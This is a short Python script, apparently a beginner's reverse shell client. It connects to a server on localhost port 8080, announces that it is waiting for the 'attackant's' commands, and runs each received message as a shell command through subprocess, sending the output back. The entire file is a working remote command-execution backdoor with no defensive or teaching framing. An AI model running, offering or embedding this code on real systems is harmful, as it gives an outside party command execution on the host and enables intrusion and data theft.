import socket
import subprocess
import shlex

hote = "localhost"
port = 8080

connexion_avec_serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion_avec_serveur.connect((hote, port))
print("I am waiting command of attackant on port {}".format(port))


msg_recu = b""
while msg_recu != b"end":
    msg_recu = connexion_avec_serveur.recv(5024)
    msg=msg_recu.decode()
    print(msg)
    args = shlex.split(msg)
    process = subprocess.Popen(args, stdout=subprocess.PIPE)
    
    stdout = process.communicate()
    print(stdout)
    stdout=stdout[0]
    connexion_avec_serveur.send(stdout)


print("Bye Bye")
connexion_avec_serveur.close()
